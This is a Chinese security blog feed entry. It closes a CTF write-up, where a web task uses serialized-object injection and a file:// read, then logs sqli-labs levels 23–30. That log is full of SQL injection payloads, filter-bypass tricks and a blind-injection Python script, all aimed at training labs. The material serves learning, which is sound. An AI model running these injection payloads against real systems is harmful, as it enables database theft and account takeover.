srcset="/img/static/loading.gif" alt=""><br>StegSolve打开看到red plane0是一片黑色，猜测和0通道有关，分别把red、blue、green和alpha的0通道提取出来<br><img src="/img/2018-08-21/1.png" srcset="/img/static/loading.gif" alt=""><br>用StegSolve的image combiner功能分别对比，在用alpha和green进行XOR对比时可以清楚的看到flag(做出来的人是怎么想到对比0通道的？。)<br><img src="/img/2018-08-21/2.png" srcset="/img/static/loading.gif" alt="2"><br>感受到了被<strong>脑洞</strong>支配的恐惧了吗<br><img src="/img/2018-08-21/12.jpg" srcset="/img/static/loading.gif" alt="11"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p><del>web狗感受到来自世界的恶意，已哭晕在厕所</del></p><h4 id="0x00-spider"><a href="#0x00-spider" class="headerlink" title="0x00 spider"></a>0x00 spider</h4><p>这道题参考官方给出的writeup–&gt;<a href="https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd" target="_blank" rel="noopener">传送门</a></p><h4 id="0x01-fakebook"><a href="#0x01-fakebook" class="headerlink" title="0x01 fakebook"></a>0x01 fakebook</h4><p>这道题是在比赛结束前1小时时候放出来的题目，一般这种题目都是送<del>分题</del>送命题<br><img src="/img/2018-08-21/11.png" srcset="/img/static/loading.gif" alt="11"><br>首先拿到题目后发现只能登陆或者join，join的时候发现第四个字段blog似乎只能是网址，一般这种有约束条件又没给出则一定是被隐藏了，查看robots.txt发现果然有东西<br><img src="/img/2018-08-21/12.png" srcset="/img/static/loading.gif" alt="12"><br>约束条件<br><img src="/img/2018-08-21/13.png" srcset="/img/static/loading.gif" alt="13"><br>join之后发现只有username可以点，点进去后发现敏感参数<br><img src="/img/2018-08-21/14.png" srcset="/img/static/loading.gif" alt="14"><br>测试后得到的信息：4个字段，过滤了<code>union select</code>，第四个参数进行了序列化<br><img src="/img/2018-08-21/15.png" srcset="/img/static/loading.gif" alt="15"><br>在一段惊天地泣鬼神的注入下然鹅并没有在数据库里发现flag<br>请教大佬获得hint1：构造类。这样构造出来的类可以执行，php代码如下<br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;&#125;$a = <span class="hljs-keyword">new</span> UserInfo();$a-&gt;name = <span class="hljs-string">'1'</span>;$a-&gt;age = <span class="hljs-number">12</span>;$a-&gt;blog = <span class="hljs-string">'baidu.com'</span>;<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></p><p><img src="/img/2018-08-21/21.png" srcset="/img/static/loading.gif" alt="21"><br><img src="/img/2018-08-21/16.png" srcset="/img/static/loading.gif" alt="16"><br>源码可以看到读取了文件<br><img src="/img/2018-08-21/18.png" srcset="/img/static/loading.gif" alt="18"><br>请教大佬获得hint2：curl读文件。<br>源码提示了php调用curl来查询的，联想到curl可以执行读文件操作<br><img src="/img/2018-08-21/17.png" srcset="/img/static/loading.gif" alt="17"><br>把baidu.com改成file:///var/www/html/user.php进行测试发现可以读取user.php的内容验证猜想<br><img src="/img/2018-08-21/19.png" srcset="/img/static/loading.gif" alt="19"><br>读flag，file:///var/www/html/flag.php<br><img src="/img/2018-08-21/20.png" srcset="/img/static/loading.gif" alt="20"></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>misc</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs的学习记录三（23-30）</title>
    <link href="/2018/08/17/sqli-labs3/"/>
    <url>/2018/08/17/sqli-labs3/</url>
    
    <content type="html"><![CDATA[<p>七夕什么的，tan90°<br><a id="more"></a></p><h5 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h5><p>测试<br><code>id=1&#39; and &#39;1&#39;=&#39;1</code>时返回正常，测试<code>id=-1&#39; order by 1 #</code>就报错了，查看源代码可以看到我们递交的参数被过滤了–和#<br><img src="/img/2018-08-17/1.png" srcset="/img/static/loading.gif" alt="1"><br><pre><code class="hljs undefined"><span class="hljs-meta">$</span><span class="bash">id=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];</span><span class="hljs-meta">$</span><span class="bash">reg = <span class="hljs-string">"/#/"</span>;</span><span class="hljs-meta">$</span><span class="bash">reg1 = <span class="hljs-string">"/--/"</span>;</span><span class="hljs-meta">$</span><span class="bash">replace = <span class="hljs-string">""</span>;</span><span class="hljs-meta">$</span><span class="bash">id = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><span class="hljs-meta">$</span><span class="bash">id = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span></code></pre></p><p>所以不能用注释的方法只能闭合查询语句，我们可以套用第八关的代码进行盲注查询<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>' and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt;= '<span class="hljs-number">97</span></code></pre></p><p><img src="/img/2018-08-17/2.png" srcset="/img/static/loading.gif" alt="2"><br>python脚本代码<br><pre><code class="hljs python"><span class="hljs-keyword">import</span> requeststxt1 = <span class="hljs-string">"http://localhost/sqli-labs/Less-23/?id=1' and ascii(substr(database(),"</span>txt2 = <span class="hljs-string">",1)) &gt;= '"</span>txt3 = <span class="hljs-string">",1)) = '"</span>payload1 = <span class="hljs-number">1</span> payload2 = <span class="hljs-number">97</span>txt4 = <span class="hljs-string">'Your Login name'</span>num11 = <span class="hljs-number">97</span>num12 = <span class="hljs-number">65</span>num13 = <span class="hljs-number">48</span>code = <span class="hljs-string">''</span>num1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):url = txt1+str(i)+txt2+str(num11)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):num1 = <span class="hljs-number">1</span>url = txt1+str(i)+txt2+str(num12)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):num2 = <span class="hljs-number">1</span>url = txt1+str(i)+txt2+str(num13)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):num3 = <span class="hljs-number">1</span><span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">1</span>):num = <span class="hljs-number">97</span>num += <span class="hljs-number">13</span>url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):num += <span class="hljs-number">6</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">7</span>url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):num += <span class="hljs-number">3</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">3</span>url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext != txt4):num -= <span class="hljs-number">3</span><span class="hljs-keyword">if</span>(reqtext == txt4) <span class="hljs-keyword">and</span> ((num == <span class="hljs-number">106</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">119</span>)):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num2 == <span class="hljs-number">1</span>):num = <span class="hljs-number">65</span>num += <span class="hljs-number">13</span>url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):num += <span class="hljs-number">6</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">7</span>url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):num += <span class="hljs-number">3</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">3</span>url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext != txt4):num -= <span class="hljs-number">3</span><span class="hljs-keyword">if</span>(reqtext == txt4) <span class="hljs-keyword">and</span> ((num == <span class="hljs-number">74</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">87</span>)):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(num2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num3 == <span class="hljs-number">1</span>):num =<span class="hljs-number">48</span>num += <span class="hljs-number">5</span>url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">5</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]<span class="hljs-keyword">if</span>(reqtext == txt4):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span></code></pre></p><p><img src="/img/2018-08-17/3.png" srcset="/img/static/loading.gif" alt="3"></p><h5 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h5><p>这道题目考的是二次注入，可以理解为第一滴构造可以注入的条件，第二次才实施注入<br>从源代码上看login.php、login_create.php都被做了过滤<br><pre><code class="hljs undefined">//login.php<span class="hljs-meta">$</span><span class="bash">username = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"login_user"</span>]);</span><span class="hljs-meta">$</span><span class="bash">password = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"login_password"</span>]);</span>//login_create.php<span class="hljs-meta">$</span><span class="bash">username=  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]) ;</span><span class="hljs-meta">$</span><span class="bash">pass= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>]);</span><span class="hljs-meta">$</span><span class="bash">re_pass= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'re_password'</span>]);</span></code></pre></p><p>mysql_real_escape_string的作用–&gt;<a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">传送门</a><br>mysql_escape_string的作用–&gt;<a href="http://www.gimoo.net/t/1410/542e28a1e826e.html" target="_blank" rel="noopener">传送门</a><br>只有在pass_change.php的username没有做过滤<br><pre><code class="hljs undefined"><span class="hljs-meta">$</span><span class="bash">username= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"username"</span>];</span><span class="hljs-meta">$</span><span class="bash">curr_pass= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'current_password'</span>]);</span><span class="hljs-meta">$</span><span class="bash">pass= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>]);</span><span class="hljs-meta">$</span><span class="bash">re_pass= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'re_password'</span>]);</span></code></pre></p><p>假设我们要攻击的用户名为admin，二次注入的方法原理为构造特殊的用户名<code>admin&#39;#</code>，在修改<code>admin&#39;#</code>的用户密码的时候会由于mysql更新语句<br><pre><code class="hljs undefined">$sql = "<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">'$pass'</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'$username'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'$curr_pass'</span> <span class="hljs-string">";</span></code></pre></p><p>变为<br><pre><code class="hljs undefined">UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">'pass'</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">'admin'</span>#' <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">'pass'</span> <span class="hljs-string">";</span></code></pre></p><p>这样就可以达到修改admin的密码的目的<br>第一步，构建特殊用户名，密码随意<br><img src="/img/2018-08-17/4.png" srcset="/img/static/loading.gif" alt="4"><br>登陆后修改密码，当前密码不用填，因为已经注释掉了<br><img src="/img/2018-08-17/5.png" srcset="/img/static/loading.gif" alt="5"><br>这样就可以修改admin的密码了<br><pre><code class="hljs undefined">mysql&gt; select <span class="hljs-symbol">*</span> from users;+----+----------+------------+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|+----+----------+------------+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>||<span class="hljs-string">  2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>||<span class="hljs-string">  3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>||<span class="hljs-string">  4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>||<span class="hljs-string">  5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>||<span class="hljs-string">  6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>||<span class="hljs-string">  7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>||<span class="hljs-string">  8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> 123        </span>|<span class="hljs-string"> //admin的默认密码是admin</span>|<span class="hljs-string">  9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>||<span class="hljs-string"> 10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>||<span class="hljs-string"> 11 </span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>||<span class="hljs-string"> 12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>||<span class="hljs-string"> 14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>||<span class="hljs-string"> 17 </span>|<span class="hljs-string"> admin'#  </span>|<span class="hljs-string"> 123        </span>|+----+----------+------------+14 rows in set (0.00 sec)</code></pre></p><h5 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h5><p>过滤<code>and</code>和<code>or</code><br>首先测试<code>id=1&#39;</code>报错说明存在单引号注入，测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code>返回正常但不是id为1的页面，从下方的提示也可以看到and被过滤掉了<br><img src="/img/2018-08-17/6.png" srcset="/img/static/loading.gif" alt="6"><br>测试<code>id=1&#39; anandd &#39;1&#39;=&#39;1</code>返回正常说明and只被过滤了一次<br><img src="/img/2018-08-17/7.png" srcset="/img/static/loading.gif" alt="7"><br>只要把and或or双写就可以绕过了<br>还有一种方法是用逻辑运算符代替，用<code>&amp;&amp;</code>代替<code>and</code>,用<code>||</code>代替<code>or</code></p><h5 id="第二十五A关"><a href="#第二十五A关" class="headerlink" title="第二十五A关"></a>第二十五A关</h5><p>这一关考的是过滤了and和or的盲注，同样过滤了and和or，可以用&amp;&amp;和||代替和双写绕过<br><pre><code class="hljs undefined">id=1 anandd if(<span class="hljs-name">length</span>(<span class="hljs-name">database</span>())&gt;8,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">10</span>)) #</code></pre></p><p>实测发现可以不用盲注直接注入<br><pre><code class="hljs undefined">id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>(),3</span></code></pre></p><h5 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h5><p>这关过滤了空格和注释<br><pre><code class="hljs undefined">function blacklist(<span class="hljs-variable">$id</span>)&#123;<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/or/i'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//strip</span> out OR (non <span class="hljs-keyword">case</span> sensitive)<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/and/i'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//</span>Strip out AND (non <span class="hljs-keyword">case</span> sensitive)<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\*]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//strip</span> out /*<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[--]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//</span>Strip out --<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[#]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\s]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//</span>Strip out spaces<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\\\\]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//</span>Strip out slashes<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;&#125;</code></pre></p><p>替换空格的方法有<br><pre><code class="hljs undefined"><span class="xml"></span><span class="perl">%09 --TAB键（水平）</span><span class="xml"></span><span class="perl">%0a --新建一行</span><span class="xml"></span><span class="perl">%0c --新的一页</span><span class="xml"></span><span class="perl">%0d --<span class="hljs-keyword">return</span></span><span class="xml"></span><span class="perl">%0b --TAB（垂直）</span><span class="xml"></span><span class="perl">%a0 --空格</span><span class="xml"></span></code></pre></p><p>最后一个会报错，在linux下可以，跟apache解析有关，测试payload为<br><pre><code class="hljs undefined">id=<span class="hljs-number">-1</span>'%<span class="hljs-number">09</span>anandd%<span class="hljs-number">09</span>'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p><p><b style="font-size: 6">然而</b><br>测试union语句竟然失败了，经过多次反复测试发现上述替换都会被过滤，<b><code>id=1&#39;anandd&#39;1&#39;=&#39;1</code></b>不加空格可以注入成功，网上找到一个盲注的方法，但还是有点缺陷<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>'anandd(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;=<span class="hljs-number">97</span>)anandd'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p><p>有待补充</p><h5 id="第二十六A关"><a href="#第二十六A关" class="headerlink" title="第二十六A关"></a>第二十六A关</h5><p>这一关和上一关一样，只不过sql语句多了括号<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>')anandd(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;=<span class="hljs-number">97</span>)anandd('<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p><h5 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h5><p>过滤了union和select，下面是过滤代码<br><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span><span class="hljs-params">($id)</span></span>&#123;$id= preg_replace(<span class="hljs-string">'/[\/\*]/'</span>,<span class="hljs-string">""</span>, $id);<span class="hljs-comment">//strip out /*</span>$id= preg_replace(<span class="hljs-string">'/[--]/'</span>,<span class="hljs-string">""</span>, $id);<span class="hljs-comment">//Strip out --.</span>$id= preg_replace(<span class="hljs-string">'/[#]/'</span>,<span class="hljs-string">""</span>, $id);<span class="hljs-comment">//Strip out #.</span>$id= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out spaces.</span>$id= preg_replace(<span class="hljs-string">'/select/m'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out spaces.</span>$id= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out spaces.</span>$id= preg_replace(<span class="hljs-string">'/union/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out union</span>$id= preg_replace(<span class="hljs-string">'/select/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out select</span>$id= preg_replace(<span class="hljs-string">'/UNION/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out UNION</span>$id= preg_replace(<span class="hljs-string">'/SELECT/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out SELECT</span>$id= preg_replace(<span class="hljs-string">'/Union/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out Union</span>$id= preg_replace(<span class="hljs-string">'/Select/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out select</span><span class="hljs-keyword">return</span> $id;&#125;</code></pre></p><p>对比二十六关过滤空格的代码少了<br><pre><code class="hljs undefined"><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\s]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//</span>Strip out spaces<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\\\\]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);<span class="hljs-regexp">//</span>Strip out slashes</code></pre></p><p>union可以双写绕过也可以大小写绕过，select要三写才可以绕过，或者大小写绕过,%09可以替换空格，猜测二十六关提到的替换方法应该也可以，注释可以用<code>and&#39;1&#39;=&#39;1</code>闭合<br><pre><code class="hljs undefined">id=<span class="hljs-number">0</span>' uniounionn%<span class="hljs-number">09</span>selecselselectectt%<span class="hljs-number">091</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">09</span>and '<span class="hljs-number">1</span>'='<span class="hljs-number">1</span>id=<span class="hljs-number">0</span>'%<span class="hljs-number">09</span>UnIoN%<span class="hljs-number">09</span>sElEcT%<span class="hljs-number">091</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">09</span>and%<span class="hljs-number">09</span>'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p><p><img src="/img/2018-08-17/8.png" srcset="/img/static/loading.gif" alt="8"></p><h5 id="第二十七A关"><a href="#第二十七A关" class="headerlink" title="第二十七A关"></a>第二十七A关</h5><p>和二十七关一样，单引号边双引号，用二十七关的方法即可绕过<br><pre><code class="hljs undefined">id=<span class="hljs-number">0</span><span class="hljs-string">"%09UnIoN%09sElEcT%091,database(),3%09and%09"</span><span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">1</span></code></pre></p><h5 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h5><p>这一关过滤了<code>union select</code>，所以要吧这个双写，把过滤代码的注释去掉要再写一次select<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>')%<span class="hljs-number">09</span>uniunion%<span class="hljs-number">09</span>selselectectoN%<span class="hljs-number">09</span>SeLeCt%<span class="hljs-number">091</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">09</span>and%<span class="hljs-number">09</span>('<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p><h5 id="第二十A关"><a href="#第二十A关" class="headerlink" title="第二十A关"></a>第二十A关</h5><p>源代码把二十八关前面的都注释了，保留了最后一个<br><pre><code class="hljs undefined"><span class="hljs-keyword">function</span> blacklist(<span class="hljs-variable">$id</span>)&#123;//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\*]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);//strip out /*//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[--]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);//Strip out --.//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[#]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);//Strip out <span class="hljs-comment">#.</span>//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);    //Strip out spaces.//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/select/m'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);   //Strip out spaces.//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);    //Strip out spaces.<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/union\s+select/i'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);    //Strip out spaces.<span class="hljs-built_in">return</span> <span class="hljs-variable">$id</span>;&#125;</code></pre></p><p>直接双写<code>union select</code><br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>') uniounion selectn select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> and ('<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p><h5 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h5><p><b style="font-size: 30px">emmm……</b><br><img src="/img/2018-08-17/9.png" srcset="/img/static/loading.gif" alt="9"><br>“This site protected by world’s best Firewall”,really？。感觉一点过滤都没有。。。</p><h5 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h5><p>感觉和第二十九关一样<br><pre><code class="hljs undefined">id=<span class="hljs-number">0</span><span class="hljs-string">" union select 1,database(),3 and "</span><span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">1</span></code></pre></p><div style="text-align: center"><br><b style="font-size: 30px;">卒</b><br></div>]]></content>
    
